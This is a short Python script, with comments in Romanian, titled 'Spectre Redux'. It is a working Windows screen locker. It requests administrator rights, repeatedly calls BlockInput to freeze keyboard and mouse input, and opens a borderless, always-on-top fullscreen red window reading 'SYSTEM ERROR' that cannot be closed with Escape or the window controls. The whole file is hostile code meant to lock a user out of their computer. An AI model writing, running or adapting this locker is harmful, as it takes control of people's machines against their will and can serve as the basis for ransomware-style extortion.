#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SPECTRE REDUX - VERSIUNE REPARATĂ
"""

import tkinter as tk
import threading
import time
import ctypes
import sys
import os

# Auto-admin
if not ctypes.windll.shell32.IsUserAnAdmin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()

# Blocare tastatură
def block_keys():
    while True:
        try:
            ctypes.windll.user32.BlockInput(True)
            time.sleep(0.1)
        except:
            pass

threading.Thread(target=block_keys, daemon=True).start()

# Creare fereastră
root = tk.Tk()

# Setăm fullscreen PRIMA DATĂ
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)

# DUPĂ fullscreen, eliminăm bordura
root.overrideredirect(True)

# Obținem dimensiunile ecranului
w = root.winfo_screenwidth()
h = root.winfo_screenheight()
root.geometry(f"{w}x{h}+0+0")

# Fundal roșu
root.configure(background="red")

# Prevenim închiderea
root.bind("<Escape>", lambda e: None)
root.protocol("WM_DELETE_WINDOW", lambda: None)

# Text
label = tk.Label(root, text="⚠️ SYSTEM ERROR ⚠️", font=("Arial", 50), fg="white", bg="red")
label.pack(expand=True)

root.mainloop()